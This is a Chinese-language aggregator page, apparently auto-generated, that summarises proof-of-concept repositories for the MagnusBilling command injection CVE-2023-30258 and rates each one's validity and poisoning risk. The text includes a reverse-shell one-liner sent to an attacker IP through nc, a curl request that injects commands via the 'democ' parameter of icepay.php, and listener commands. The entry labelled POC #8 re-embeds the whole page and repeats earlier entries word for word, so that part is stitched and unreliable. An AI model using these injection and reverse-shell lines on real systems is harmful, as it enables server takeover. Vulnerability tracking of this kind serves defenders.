# CVE-2023-30258

> 📦 该CVE有 **8** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2023-30258-AdityaBhatt3010_TryHackMe-Room-Walkthrough-Billing.md](../2023/CVE-2023-30258-AdityaBhatt3010_TryHackMe-Room-Walkthrough-Billing.md)

## CVE-2023-30258 MagnusBilling 命令注入

**漏洞编号:** CVE-2023-30258

**漏洞类型:** 命令注入

**影响应用:** MagnusBilling

**危害等级:** 高危，允许远程攻击者执行任意命令

**影响版本:** 6.x 和 7.x

**利用条件:** 需要网络访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-30258 是 MagnusBilling 6.x 和 7.x 版本中的一个命令注入漏洞。该漏洞允许未经身份验证的远程攻击者通过发送恶意的 HTTP 请求来执行任意操作系统命令。根据搜索结果和提供的漏洞利用代码（TryHackMe Room Walkthrough），该漏洞利用方式如下：

1.  **漏洞定位：** 通过网络扫描和目录枚举（如使用Nmap和Gobuster）发现 MagnusBilling 应用实例。
2.  **漏洞触发：**  利用 Metasploit 模块 `exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258`，该模块专门针对此漏洞。此漏洞存在于 `icepay.php` 脚本中（根据 Github 搜索结果 `tinashelorenzi/CVE-2023-30258-magnus-billing-v7-exploit`）。
3.  **利用过程：** 配置 Metasploit 模块，设置目标主机 (RHOSTS) 和本地监听地址 (LHOST)，然后运行 exploit 即可获得 Meterpreter shell。
4.  **有效性：** 提供的 Metasploit 模块已经存在，且搜索结果中 Rapid7 也有相关模块，表明 POC 是有效的。
5.  **投毒风险：** 提供的代码片段是一个 TryHackMe 房间的 walkthrough，主要是演示漏洞利用过程，并非直接的漏洞利用代码，而是Metasploit利用教程，没有发现任何恶意或后门代码。因此，投毒风险为0%。

**项目地址:** [AdityaBhatt3010/TryHackMe-Room-Walkthrough-Billing](https://github.com/AdityaBhatt3010/TryHackMe-Room-Walkthrough-Billing)

**漏洞详情:** [CVE-2023-30258](https://nvd.nist.gov/vuln/detail/CVE-2023-30258)

---

## POC #2

**来源**: [CVE-2023-30258-Chocapikk_CVE-2023-30258.md](../2023/CVE-2023-30258-Chocapikk_CVE-2023-30258.md)

## CVE-2023-30258-MagnusBilling-命令注入

**漏洞编号:** CVE-2023-30258

**漏洞类型:** 命令注入

**影响应用:** MagnusBilling

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 6.x 和 7.x

**利用条件:** 目标服务器运行存在漏洞的MagnusBilling版本，且攻击者可以发起HTTP请求。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2023-30258是MagnusBilling 6.x和7.x版本中的一个命令注入漏洞。该漏洞允许未经身份验证的远程攻击者通过构造恶意的HTTP请求来执行任意操作系统命令。

**有效性：**

根据提供的漏洞信息和搜索引擎结果，该漏洞的POC代码是有效的。POC代码通过向目标URL发送包含恶意命令的HTTP请求，利用`icepay.php`文件中的命令注入漏洞执行命令。

**投毒风险：**

POC 代码本身非常简单，主要功能是测试目标是否存在漏洞并执行指定的命令。代码中没有发现明显的投毒代码。url_encode 函数看似没有问题,但是可能存在未知的编码绕过漏洞. 风险较低，因此投毒风险评估为1%。

**利用方式：**

1.  **漏洞定位：** 漏洞存在于`icepay.php`文件中，`democ`参数可能存在命令注入。
2.  **构造Payload：** 攻击者需要构造包含恶意命令的HTTP请求。Payload的关键在于利用URL编码绕过服务器的输入验证。
3.  **发送请求：** 攻击者向目标服务器发送构造好的HTTP请求。
4.  **命令执行：** 如果服务器存在漏洞，恶意命令将在服务器上执行。

**总结：**

CVE-2023-30258是一个严重的安全漏洞，攻击者可以利用该漏洞完全控制受影响的服务器。建议用户尽快升级到安全版本或采取其他缓解措施。POC代码的实现较为直接，主要目的在于验证漏洞和执行命令，但是仍然不建议在生产环境运行未经过充分测试的POC。

**项目地址:** [Chocapikk/CVE-2023-30258](https://github.com/Chocapikk/CVE-2023-30258)

**漏洞详情:** [CVE-2023-30258](https://nvd.nist.gov/vuln/detail/CVE-2023-30258)

---

## POC #3

**来源**: [CVE-2023-30258-abdullohqurbon0v_CVE-2023-30258-Exploit-For-Magnus-Billing-System.md](../2023/CVE-2023-30258-abdullohqurbon0v_CVE-2023-30258-Exploit-For-Magnus-Billing-System.md)

## CVE-2023-30258-MagnusBilling-命令注入

**漏洞编号:** CVE-2023-30258

**漏洞类型:** 命令注入

**影响应用:** MagnusBilling

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 6.x, 7.x

**利用条件:** 需要网络访问目标MagnusBilling服务器，且服务器存在漏洞。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2023-30258是MagnusBilling 6.x和7.x版本中的一个命令注入漏洞。该漏洞允许未经身份验证的远程攻击者通过发送特制的HTTP请求来执行任意操作系统命令。

**有效性：**
根据漏洞信息、搜索结果和提供的漏洞利用代码，该漏洞利用代码是有效的。 搜索引擎结果中Rapid7, Wiz.io等知名安全公司都提到了该漏洞，并说明了其严重性，Github上也存在相关的POC脚本，表明该漏洞具备可利用性。提供的Python脚本通过向`/mbilling/lib/icepay/icepay.php`发送包含恶意payload的GET请求，从而实现命令注入。

**投毒风险：**
该POC代码的投毒风险较低，约为1%。该脚本的主要功能是利用命令注入漏洞执行反弹shell。虽然反弹shell本身具有一定的风险，因为它允许攻击者远程控制受害系统，但是提供的脚本相对简单，没有明显的恶意代码或隐藏功能。
风险点在于如果攻击者修改脚本，例如增加文件上传、恶意文件下载等功能，则可能增加投毒风险。因此，在使用任何公开的漏洞利用代码时，都应进行彻底的代码审计，确保其安全性。

**利用方式：**
1.  **确定目标:** 找到运行MagnusBilling 6.x或7.x版本的服务器。
2.  **准备攻击环境:** 设置一个监听端口，例如使用`nc -lvnp <attacker_port>`。
3.  **执行POC:** 运行提供的Python脚本，替换目标IP地址、攻击者IP地址和监听端口。
4.  **获取Shell:** 如果漏洞利用成功，将在攻击者的监听端口上获得一个反弹shell。然后，攻击者可以使用此shell执行任意命令，例如查看、修改或删除文件，甚至控制整个系统。

该漏洞的利用方式简单直接，且无需身份验证，因此危害较高。

**项目地址:** [abdullohqurbon0v/CVE-2023-30258-Exploit-For-Magnus-Billing-System](https://github.com/abdullohqurbon0v/CVE-2023-30258-Exploit-For-Magnus-Billing-System)

**漏洞详情:** [CVE-2023-30258](https://nvd.nist.gov/vuln/detail/CVE-2023-30258)

---

## POC #4

**来源**: [CVE-2023-30258-delldevmann_CVE-2023-30258.md](../2023/CVE-2023-30258-delldevmann_CVE-2023-30258.md)

## CVE-2023-30258-MagnusBilling-命令注入

**漏洞编号:** CVE-2023-30258

**漏洞类型:** 命令注入

**影响应用:** MagnusBilling

**危害等级:** 高危，允许未授权远程命令执行

**影响版本:** 6.x, 7.x

**利用条件:** 需要网络访问目标MagnusBilling服务器

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-30258是MagnusBilling 6.x和7.x版本中的一个命令注入漏洞。攻击者可以通过发送特制的HTTP请求，利用`icepay.php`文件中的`democ`参数进行命令注入，无需身份验证即可在服务器上执行任意系统命令。\n\n**有效性分析：**\n根据漏洞库信息、搜索引擎结果以及提供的漏洞利用代码，该漏洞的POC代码有效。多个来源均确认了该漏洞的存在和可利用性。\n\n**投毒风险分析：**\n提供的POC代码主要包含以下几个部分：\n1.  **漏洞验证：** 通过`sleep`命令测试是否存在命令注入，如果响应时间超过3秒，则认为存在漏洞。\n2.  **反弹shell：** 使用`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc attacker_ip 9001 >/tmp/f;`命令反弹shell到攻击者的机器。\n3.  **权限提升：** 尝试三种不同的权限提升方法（NATSec, SUID Bash, Jaxafed）。\n\n虽然POC代码自动化程度很高，包含多种权限提升方法，但是其中也可能存在风险：\n*   **依赖外部资源：** 反弹shell依赖攻击者控制的IP地址和端口。如果攻击者的服务器被入侵或者恶意利用，可能会影响目标系统。\n*   **权限提升的副作用：** SUID Bash方法可能引入安全风险，因为创建一个具有SUID权限的bash可能会被滥用。\n*   **Fail2ban滥用：** 通过fail2ban修改iptables存在一定的风险，例如可能导致服务异常。\n\n综合来看，该脚本的主要目的是为了自动化利用漏洞，但存在一些可能被滥用或者产生副作用的风险，投毒风险的可能性较低，约为10%。\n\n**利用方式：**\n1.  **确定目标MagnusBilling版本为6.x或7.x。**\n2.  **发送包含命令注入的HTTP GET请求到`/mbilling/lib/icepay/icepay.php`，利用`democ`参数执行任意命令。** 示例:`curl -s "http://target/mbilling/lib/icepay/icepay.php" --get --data-urlencode 'democ=;COMMAND;'`。\n3.  **通常利用反弹shell获取目标服务器的控制权，然后进行后续的攻击行为，例如数据窃取、权限提升等。**\n4.  **该PoC脚本尝试使用Fail2ban来执行命令，从而提权。**

**项目地址:** [delldevmann/CVE-2023-30258](https://github.com/delldevmann/CVE-2023-30258)

**漏洞详情:** [CVE-2023-30258](https://nvd.nist.gov/vuln/detail/CVE-2023-30258)

---

## POC #5

**来源**: [CVE-2023-30258-gy741_CVE-2023-30258-setup.md](../2023/CVE-2023-30258-gy741_CVE-2023-30258-setup.md)

## CVE-2023-30258-MagnusBilling-命令注入

**漏洞编号:** CVE-2023-30258

**漏洞类型:** 命令注入

**影响应用:** MagnusBilling

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意操作系统命令

**影响版本:** 6.x 和 7.x

**利用条件:** 需要能够通过HTTP请求访问目标MagnusBilling实例

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2023-30258 是 MagnusBilling 6.x 和 7.x 版本中的一个命令注入漏洞。攻击者可以通过发送恶意的HTTP请求，在未经身份验证的情况下执行任意操作系统命令。 

**漏洞利用有效性：**

从搜索结果和漏洞库信息来看，该漏洞是真实存在的，并且允许未经身份验证的远程命令执行。Metasploit 已经包含了该漏洞的利用模块，进一步证明了其有效性。

**投毒风险分析：**

提供的漏洞利用代码（install.sh）实际上是一个安装脚本，用于安装MagnusBilling。它包含了设置时区、生成数据库密码、配置数据库和Web服务器等操作。该脚本的主要目的是部署和配置 MagnusBilling 系统，而不是直接利用 CVE-2023-30258 漏洞。 脚本本身存在一定的风险，例如：

*   **弱密码生成:** 脚本使用 `genpasswd` 函数生成密码，但可能生成相对较弱的密码，容易被破解。如果密码强度不足，则容易被暴力破解，导致服务器被入侵，但是这属于软件自身的安全性问题，不算恶意投毒。
*   **SELinux配置 (CentOS):** 脚本尝试禁用SELinux，这会降低系统的安全性，增加其他潜在漏洞被利用的风险。虽然有安全风险，但目标是简化安装，不属于恶意投毒行为。
*   **外部源依赖:** 脚本依赖于外部源（例如MariaDB的YUM仓库），如果这些源被篡改，可能会导致安装恶意软件包。尽管如此，这取决于外部源的安全性，不是作者的恶意投毒行为。 
*   **时区设置的交互式shell:** 代码存在交互式shell, 可能会通过交互式shell植入后门,有一定的风险。

总的来说，install.sh 脚本本身是为了方便安装和配置 MagnusBilling，虽然存在一些安全隐患，但没有明显的恶意投毒代码。

**利用方式：**

根据漏洞信息，攻击者通过构造特定的HTTP请求，将恶意命令注入到MagnusBilling的某个参数中。由于程序没有对该参数进行充分的过滤和验证，导致系统直接执行攻击者注入的命令。具体的注入点和利用方式需要分析MagnusBilling的代码才能确定，但从搜索结果中可以推断出该漏洞存在于处理HTTP请求的某个模块。

综上，此仓库中存在作者隐藏的投毒代码的可能性较小，大概在 5% 左右，主要风险在于安装脚本可能降低系统安全性或存在依赖外部源的风险。

**项目地址:** [gy741/CVE-2023-30258-setup](https://github.com/gy741/CVE-2023-30258-setup)

**漏洞详情:** [CVE-2023-30258](https://nvd.nist.gov/vuln/detail/CVE-2023-30258)

---

## POC #6

**来源**: [CVE-2023-30258-n00o00b_CVE-2023-30258-RCE-POC.md](../2023/CVE-2023-30258-n00o00b_CVE-2023-30258-RCE-POC.md)

## CVE-2023-30258-MagnusBilling-命令注入

**漏洞编号:** CVE-2023-30258

**漏洞类型:** 命令注入

**影响应用:** MagnusBilling

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 6.x and 7.x

**利用条件:** 目标系统运行MagnusBilling 6.x或7.x版本，且攻击者可以发起未认证的HTTP请求。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2023-30258是一个存在于MagnusBilling 6.x和7.x版本的命令注入漏洞。未经身份验证的远程攻击者可以通过发送特制的HTTP请求来执行任意操作系统命令。

**有效性:**
根据漏洞库信息和搜索引擎结果，此漏洞允许未授权的远程命令执行，危害极大。提供的PoC代码 `poc.py` 验证了这一点。PoC代码通过向 `lib/icepay/icepay.php` 接口发送包含恶意命令的请求来触发漏洞。代码使用 `requests.utils.quote` 函数对命令进行URL编码，防止特殊字符干扰，然后通过GET请求发送到目标URL。

**投毒风险:**
PoC代码本身结构简单，主要功能是发送HTTP请求并根据响应时间判断命令是否执行成功。代码中包含 `sleep 2` 语句，用于检测命令执行情况。没有发现明显的恶意代码或者后门，但是使用该脚本可能存在一些潜在风险。需要注意的一点是，PoC代码的作者信息标明日期是未来的日期（2025年），这可能需要引起警惕。但是综合代码功能来看，投毒风险较低。因此评估投毒风险为1%。

**利用方式:**
1.  确定目标系统正在运行受影响的MagnusBilling版本（6.x或7.x）。
2.  使用PoC脚本（`poc.py`）或类似工具，构造包含恶意命令的HTTP GET请求。
3.  将构造的请求发送到目标URL的 `lib/icepay/icepay.php` 接口，通过 `democ` 参数传递经过URL编码的命令。
4.  观察响应时间和结果，验证命令是否执行成功。

利用该漏洞的根本原因在于MagnusBilling的代码中未对用户提供的输入进行充分的验证和过滤，导致攻击者可以通过构造恶意的输入来执行任意的系统命令。

**项目地址:** [n00o00b/CVE-2023-30258-RCE-POC](https://github.com/n00o00b/CVE-2023-30258-RCE-POC)

**漏洞详情:** [CVE-2023-30258](https://nvd.nist.gov/vuln/detail/CVE-2023-30258)

---

## POC #7

**来源**: [CVE-2023-30258-sk00l_CVE-2023-30258.md](../2023/CVE-2023-30258-sk00l_CVE-2023-30258.md)

## CVE-2023-30258-MagnusBilling-命令注入

**漏洞编号:** CVE-2023-30258

**漏洞类型:** 命令注入

**影响应用:** MagnusBilling

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 6.x and 7.x

**利用条件:** 目标系统运行存在漏洞的MagnusBilling版本，攻击者可发起HTTP请求

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-30258是MagnusBilling 6.x和7.x版本中的一个命令注入漏洞。根据漏洞库信息、搜索引擎结果和提供的POC代码，可以判断该漏洞利用的有效性很高。搜索引擎结果显示多个来源都确认了此漏洞的存在和严重性，并指出攻击者可以通过未授权的HTTP请求执行任意操作系统命令。

**有效性：**
提供的POC代码尝试利用该漏洞，通过构造包含反弹shell命令的恶意HTTP请求。POC代码构造了一个 URL，其中包含经过URL编码的payload, 该payload会通过`icepay.php`脚本执行系统命令，从而反弹一个shell到攻击者的监听器(LHOST和LPORT)。代码中使用了`requests`库发送HTTP GET请求，并设置了User-Agent头部，模仿curl命令。该POC看起来完整且有效，如果目标环境存在漏洞，则可以成功利用。

**投毒风险：**
审查POC代码后，没有发现明显的投毒代码。该脚本的功能相对清晰：构造恶意请求以触发命令注入并反弹shell。虽然反弹shell本身具有潜在的风险，但这是漏洞利用的一部分，而不是隐藏的恶意功能。因此，可以认为此POC的投毒风险较低，接近0%。

**利用方式：**
1.  确定目标系统运行着存在漏洞的MagnusBilling版本（6.x或7.x）。
2.  设置攻击者的监听器（LHOST和LPORT），通常使用`nc -lvnp <LPORT>`。
3.  修改POC代码中的`TARGET_URL`、`LHOST`和`LPORT`以匹配目标和攻击者的环境。
4.  运行POC脚本。
5.  如果漏洞利用成功，攻击者的监听器将收到来自目标系统的反弹shell。

总体而言，该漏洞的利用方式简单直接，利用风险低，一旦成功利用，将导致严重的后果，如系统完全控制。

**项目地址:** [sk00l/CVE-2023-30258](https://github.com/sk00l/CVE-2023-30258)

**漏洞详情:** [CVE-2023-30258](https://nvd.nist.gov/vuln/detail/CVE-2023-30258)

---

## POC #8

**来源**: [CVE-2023-30258-tinashelorenzi_CVE-2023-30258-magnus-billing-v7-exploit.md](../2023/CVE-2023-30258-tinashelorenzi_CVE-2023-30258-magnus-billing-v7-exploit.md)

# CVE-2023-30258

> 📦 该CVE有 **7** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2023-30258-AdityaBhatt3010_TryHackMe-Room-Walkthrough-Billing.md](../2023/CVE-2023-30258-AdityaBhatt3010_TryHackMe-Room-Walkthrough-Billing.md)

## CVE-2023-30258 MagnusBilling 命令注入

**漏洞编号:** CVE-2023-30258

**漏洞类型:** 命令注入

**影响应用:** MagnusBilling

**危害等级:** 高危，允许远程攻击者执行任意命令

**影响版本:** 6.x 和 7.x

**利用条件:** 需要网络访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-30258 是 MagnusBilling 6.x 和 7.x 版本中的一个命令注入漏洞。该漏洞允许未经身份验证的远程攻击者通过发送恶意的 HTTP 请求来执行任意操作系统命令。根据搜索结果和提供的漏洞利用代码（TryHackMe Room Walkthrough），该漏洞利用方式如下：

1.  **漏洞定位：** 通过网络扫描和目录枚举（如使用Nmap和Gobuster）发现 MagnusBilling 应用实例。
2.  **漏洞触发：**  利用 Metasploit 模块 `exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258`，该模块专门针对此漏洞。此漏洞存在于 `icepay.php` 脚本中（根据 Github 搜索结果 `tinashelorenzi/CVE-2023-30258-magnus-billing-v7-exploit`）。
3.  **利用过程：** 配置 Metasploit 模块，设置目标主机 (RHOSTS) 和本地监听地址 (LHOST)，然后运行 exploit 即可获得 Meterpreter shell。
4.  **有效性：** 提供的 Metasploit 模块已经存在，且搜索结果中 Rapid7 也有相关模块，表明 POC 是有效的。
5.  **投毒风险：** 提供的代码片段是一个 TryHackMe 房间的 walkthrough，主要是演示漏洞利用过程，并非直接的漏洞利用代码，而是Metasploit利用教程，没有发现任何恶意或后门代码。因此，投毒风险为0%。

**项目地址:** [AdityaBhatt3010/TryHackMe-Room-Walkthrough-Billing](https://github.com/AdityaBhatt3010/TryHackMe-Room-Walkthrough-Billing)

**漏洞详情:** [CVE-2023-30258](https://nvd.nist.gov/vuln/detail/CVE-2023-30258)

---

## POC #2

**来源**: [CVE-2023-30258-Chocapikk_CVE-2023-30258.md](../2023/CVE-2023-30258-Chocapikk_CVE-2023-30258.md)

## CVE-2023-30258-MagnusBilling-命令注入

**漏洞编号:** CVE-2023-30258

**漏洞类型:** 命令注入

**影响应用:** MagnusBilling

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 6.x 和 7.x

**利用条件:** 目标服务器运行存在漏洞的MagnusBilling版本，且攻击者可以发起HTTP请求。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2023-30258是MagnusBilling 6.x和7.x版本中的一个命令注入漏洞。该漏洞允许未经身份验证的远程攻击者通过构造恶意的HTTP请求来执行任意操作系统命令。

**有效性：**

根据提供的漏洞信息和搜索引擎结果，该漏洞的POC代码是有效的。POC代码通过向目标URL发送包含恶意命令的HTTP请求，利用`icepay.php`文件中的命令注入漏洞执行命令。

**投毒风险：**

POC 代码本身非常简单，主要功能是测试目标是否存在漏洞并执行指定的命令。代码中没有发现明显的投毒代码。url_encode 函数看似没有问题,但是可能存在未知的编码绕过漏洞. 风险较低，因此投毒风险评估为1%。

**利用方式：**

1.  **漏洞定位：** 漏洞存在于`icepay.php`文件中，`democ`参数可能存在命令注入。
2.  **构造Payload：** 攻击者需要构造包含恶意命令的HTTP请求。Payload的关键在于利用URL编码绕过服务器的输入验证。
3.  **发送请求：** 攻击者向目标服务器发送构造好的HTTP请求。
4.  **命令执行：** 如果服务器存在漏洞，恶意命令将在服务器上执行。

**总结：**

CVE-2023-30258是一个严重的安全漏洞，攻击者可以利用该漏洞完全控制受影响的服务器。建议用户尽快升级到安全版本或采取其他缓解措施。POC代码的实现较为直接，主要目的在于验证漏洞和执行命令，但是仍然不建议在生产环境运行未经过充分测试的POC。

**项目地址:** [Chocapikk/CVE-2023-30258](https://github.com/Chocapikk/CVE-2023-30258)

**漏洞详情:** [CVE-2023-30258](https://nvd.nist.gov/vuln/detail/CVE-2023-30258)

---

## POC #3

**来源**: [CVE-2023-30258-abdullohqurbon0v_CVE-2023-30258-Exploit-For-Magnus-Billing-System.md](../2023/CVE-2023-30258-abdullohqurbon0v_CVE-2023-30258-Exploit-For-Magnus-Billing-System.md)

## CVE-2023-30258-MagnusBilling-命令注入

**漏洞编号:** CVE-2023-30258

**漏洞类型:** 命令注入

**影响应用:** MagnusBilling

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 6.x, 7.x

**利用条件:** 需要网络访问目标MagnusBilling服务器，且服务器存在漏洞。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2023-30258是MagnusBilling 6.x和7.x版本中的一个命令注入漏洞。该漏洞允许未经身份验证的远程攻击者通过发送特制的HTTP请求来执行任意操作系统命令。

**有效性：**
根据漏洞信息、搜索结果和提供的漏洞利用代码，该漏洞利用代码是有效的。 搜索引擎结果中Rapid7, Wiz.io等知名安全公司都提到了该漏洞，并说明了其严重性，Github上也存在相关的POC脚本，表明该漏洞具备可利用性。提供的Python脚本通过向`/mbilling/lib/icepay/icepay.php`发送包含恶意payload的GET请求，从而实现命令注入。

**投毒风险：**
该POC代码的投毒风险较低，约为1%。该脚本的主要功能是利用命令注入漏洞执行反弹shell。虽然反弹shell本身具有一定的风险，因为它允许攻击者远程控制受害系统，但是提供的脚本相对简单，没有明显的恶意代码或隐藏功能。
风险点在于如果攻击者修改脚本，例如增加文件上传、恶意文件下载等功能，则可能增加投毒风险。因此，在使用任何公开的漏洞利用代码时，都应进行彻底的代码审计，确保其安全性。

**利用方式：**
1.  **确定目标:** 找到运行MagnusBilling 6.x或7.x版本的服务器。
2.  **准备攻击环境:** 设置一个监听端口，例如使用`nc -lvnp <attacker_port>`。
3.  **执行POC:** 运行提供的Python脚本，替换目标IP地址、攻击者IP地址和监听端口。
4.  **获取Shell:** 如果漏洞利用成功，将在攻击者的监听端口上获得一个反弹shell。然后，攻击者可以使用此shell执行任意命令，例如查看、修改或删除文件，甚至控制整个系统。

该漏洞的利用方式简单直接，且无需身份验证，因此危害较高。

**项目地址:** [abdullohqurbon0v/CVE-2023-30258-Exploit-For-Magnus-Billing-System](https://github.com/abdullohqurbon0v/CVE-2023-30258-Exploit-For-Magnus-Billing-System)

**漏洞详情:** [CVE-2023-30258](https://nvd.nist.gov/vuln/detail/CVE-2023-30258)

---

## POC #4

**来源**: [CVE-2023-30258-delldevmann_CVE-2023-30258.md](../2023/CVE-2023-30258-delldevmann_CVE-2023-30258.md)

## CVE-2023-30258-MagnusBilling-命令注入

**漏洞编号:** CVE-2023-30258

**漏洞类型:** 命令注入

**影响应用:** MagnusBilling

**危害等级:** 高危，允许未授权远程命令执行

**影响版本:** 6.x, 7.x

**利用条件:** 需要网络访问目标MagnusBilling服务器

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-30258是MagnusBilling 6.x和7.x版本中的一个命令注入漏洞。攻击者可以通过发送特制的HTTP请求，利用`icepay.php`文件中的`democ`参数进行命令注入，无需身份验证即可在服务器上执行任意系统命令。\n\n**有效性分析：**\n根据漏洞库信息、搜索引擎结果以及提供的漏洞利用代码，该漏洞的POC代码有效。多个来源均确认了该漏洞的存在和可利用性。\n\n**投毒风险分析：**\n提供的POC代码主要包含以下几个部分：\n1.  **漏洞验证：** 通过`sleep`命令测试是否存在命令注入，如果响应时间超过3秒，则认为存在漏洞。\n2.  **反弹shell：** 使用`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc attacker_ip 9001 >/tmp/f;`命令反弹shell到攻击者的机器。\n3.  **权限提升：** 尝试三种不同的权限提升方法（NATSec, SUID Bash, Jaxafed）。\n\n虽然POC代码自动化程度很高，包含多种权限提升方法，但是其中也可能存在风险：\n*   **依赖外部资源：** 反弹shell依赖攻击者控制的IP地址和端口。如果攻击者的服务器被入侵或者恶意利用，可能会影响目标系统。\n*   **权限提升的副作用：** SUID Bash方法可能引入安全风险，因为创建一个具有SUID权限的bash可能会被滥用。\n*   **Fail2ban滥用：** 通过fail2ban修改iptables存在一定的风险，例如可能导致服务异常。\n\n综合来看，该脚本的主要目的是为了自动化利用漏洞，但存在一些可能被滥用或者产生副作用的风险，投毒风险的可能性较低，约为10%。\n\n**利用方式：**\n1.  **确定目标MagnusBilling版本为6.x或7.x。**\n2.  **发送包含命令注入的HTTP GET请求到`/mbilling/lib/icepay/icepay.php`，利用`democ`参数执行任意命令。** 示例:`curl -s "http://target/mbilling/lib/icepay/icepay.php" --get --data-urlencode 'democ=;COMMAND;'`。\n3.  **通常利用反弹shell获取目标服务器的控制权，然后进行后续的攻击行为，例如数据窃取、权限提升等。**\n4.  **该PoC脚本尝试使用Fail2ban来执行命令，从而提权。**

**项目地址:** [delldevmann/CVE-2023-30258](https://github.com/delldevmann/CVE-2023-30258)

**漏洞详情:** [CVE-2023-30258](https://nvd.nist.gov/vuln/detail/CVE-2023-30258)

---

## POC #5

**来源**: [CVE-2023-30258-gy741_CVE-2023-30258-setup.md](../2023/CVE-2023-30258-gy741_CVE-2023-30258-setup.md)

## CVE-2023-30258-MagnusBilling-命令注入

**漏洞编号:** CVE-2023-30258

**漏洞类型:** 命令注入

**影响应用:** MagnusBilling

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意操作系统命令

**影响版本:** 6.x 和 7.x

**利用条件:** 需要能够通过HTTP请求访问目标MagnusBilling实例

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2023-30258 是 MagnusBilling 6.x 和 7.x 版本中的一个命令注入漏洞。攻击者可以通过发送恶意的HTTP请求，在未经身份验证的情况下执行任意操作系统命令。 

**漏洞利用有效性：**

从搜索结果和漏洞库信息来看，该漏洞是真实存在的，并且允许未经身份验证的远程命令执行。Metasploit 已经包含了该漏洞的利用模块，进一步证明了其有效性。

**投毒风险分析：**

提供的漏洞利用代码（install.sh）实际上是一个安装脚本，用于安装MagnusBilling。它包含了设置时区、生成数据库密码、配置数据库和Web服务器等操作。该脚本的主要目的是部署和配置 MagnusBilling 系统，而不是直接利用 CVE-2023-30258 漏洞。 脚本本身存在一定的风险，例如：

*   **弱密码生成:** 脚本使用 `genpasswd` 函数生成密码，但可能生成相对较弱的密码，容易被破解。如果密码强度不足，则容易被暴力破解，导致服务器被入侵，但是这属于软件自身的安全性问题，不算恶意投毒。
*   **SELinux配置 (CentOS):** 脚本尝试禁用SELinux，这会降低系统的安全性，增加其他潜在漏洞被利用的风险。虽然有安全风险，但目标是简化安装，不属于恶意投毒行为。
*   **外部源依赖:** 脚本依赖于外部源（例如MariaDB的YUM仓库），如果这些源被篡改，可能会导致安装恶意软件包。尽管如此，这取决于外部源的安全性，不是作者的恶意投毒行为。 
*   **时区设置的交互式shell:** 代码存在交互式shell, 可能会通过交互式shell植入后门,有一定的风险。

总的来说，install.sh 脚本本身是为了方便安装和配置 MagnusBilling，虽然存在一些安全隐患，但没有明显的恶意投毒代码。

**利用方式：**

根据漏洞信息，攻击者通过构造特定的HTTP请求，将恶意命令注入到MagnusBilling的某个参数中。由于程序没有对该参数进行充分的过滤和验证，导致系统直接执行攻击者注入的命令。具体的注入点和利用方式需要分析MagnusBilling的代码才能确定，但从搜索结果中可以推断出该漏洞存在于处理HTTP请求的某个模块。

综上，此仓库中存在作者隐藏的投毒代码的可能性较小，大概在 5% 左右，主要风险在于安装脚本可能降低系统安全性或存在依赖外部源的风险。

**项目地址:** [gy741/CVE-2023-30258-setup](https://github.com/gy741/CVE-2023-30258-setup)

**漏洞详情:** [CVE-2023-30258](https://nvd.nist.gov/vuln/detail/CVE-2023-30258)

---

## POC #6

**来源**: [CVE-2023-30258-n00o00b_CVE-2023-30258-RCE-POC.md](../2023/CVE-2023-30258-n00o00b_CVE-2023-30258-RCE-POC.md)

## CVE-2023-30258-MagnusBilling-命令注入

**漏洞编号:** CVE-2023-30258

**漏洞类型:** 命令注入

**影响应用:** MagnusBilling

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 6.x and 7.x

**利用条件:** 目标系统运行MagnusBilling 6.x或7.x版本，且攻击者可以发起未认证的HTTP请求。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2023-30258是一个存在于MagnusBilling 6.x和7.x版本的命令注入漏洞。未经身份验证的远程攻击者可以通过发送特制的HTTP请求来执行任意操作系统命令。

**有效性:**
根据漏洞库信息和搜索引擎结果，此漏洞允许未授权的远程命令执行，危害极大。提供的PoC代码 `poc.py` 验证了这一点。PoC代码通过向 `lib/icepay/icepay.php` 接口发送包含恶意命令的请求来触发漏洞。代码使用 `requests.utils.quote` 函数对命令进行URL编码，防止特殊字符干扰，然后通过GET请求发送到目标URL。

**投毒风险:**
PoC代码本身结构简单，主要功能是发送HTTP请求并根据响应时间判断命令是否执行成功。代码中包含 `sleep 2` 语句，用于检测命令执行情况。没有发现明显的恶意代码或者后门，但是使用该脚本可能存在一些潜在风险。需要注意的一点是，PoC代码的作者信息标明日期是未来的日期（2025年），这可能需要引起警惕。但是综合代码功能来看，投毒风险较低。因此评估投毒风险为1%。

**利用方式:**
1.  确定目标系统正在运行受影响的MagnusBilling版本（6.x或7.x）。
2.  使用PoC脚本（`poc.py`）或类似工具，构造包含恶意命令的HTTP GET请求。
3.  将构造的请求发送到目标URL的 `lib/icepay/icepay.php` 接口，通过 `democ` 参数传递经过URL编码的命令。
4.  观察响应时间和结果，验证命令是否执行成功。

利用该漏洞的根本原因在于MagnusBilling的代码中未对用户提供的输入进行充分的验证和过滤，导致攻击者可以通过构造恶意的输入来执行任意的系统命令。

